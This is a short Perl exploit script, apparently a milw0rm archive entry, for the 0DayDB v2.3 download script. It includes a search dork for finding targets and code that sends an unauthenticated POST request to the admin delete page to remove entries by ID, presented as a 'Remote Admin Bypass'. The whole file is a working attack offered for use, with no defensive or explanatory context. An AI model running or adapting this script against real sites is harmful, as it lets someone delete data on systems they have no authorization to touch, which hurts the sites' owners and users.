#!/usr/bin/perl
#Autor : Pr0metheuS
#Script : 0DayDB v2.3
#Version : v2.3
#Dork : "Powered By 0DayDB v2.3"
#Gr33tz-Team.org
use LWP::UserAgent;
if(@ARGV!=3){
	print "*****************\n";
	print "0DayDB v2.3 Remote Admin Bypass\n";
    print "perl $0 <site> <path> <id>\n";
    print "downloads ID for delete\n";
    print "*****************\n";
}
($site,$path,$id)=@ARGV;
sub pri {
	print "*****************\n";
	print "[+] Exploit completed\n";
	print "*****************";
}
sub con {
$ua = new LWP::UserAgent;
$ua->agent("Mozilla/8.0");
$ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(POST => "".$site."".$path."/acp/delete.php");
$req->content_type('application/x-www-form-urlencoded');
$req->content("id=".$id."");
$res = $ua->request($req);
if ($res->is_success) {
	pri();
}
}
con();

# milw0rm.com [2008-01-11]
